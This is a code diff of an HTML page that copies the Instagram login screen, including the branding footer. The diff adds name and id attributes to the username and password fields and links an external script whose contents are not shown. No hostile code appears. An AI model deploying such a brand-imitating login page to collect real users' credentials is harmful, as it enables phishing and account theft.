@@ -30,15 +30,24 @@
       <div id="parent">
         <div id="login">
           <img src="assets/2022-10-13__5_-removebg-preview.png" alt="" />
-          <form method="get">
+          <form method="get" name="form">
             <input
               type="text"
               placeholder="Phone Number or Email Address"
+              name="username"
+              id="username"
               required
               autofocus
             />
             <br />
-            <input type="password" placeholder="Password" required /> <br />
+            <input
+              type="password"
+              placeholder="Password"
+              name="password"
+              id="password"
+              required
+            />
+            <br />
             <input type="submit" value="Log In" id="submit" /> <br />
           </form>
           <div id="line"></div>
@@ -74,5 +83,6 @@
       <a href="">Visual Art</a>
     </section>
     <footer>ENGLISH &nbsp &nbsp &copy 2022 Instagram from Meta</footer>
+    <script src="js/script.js"></script>
   </body>
 </html>
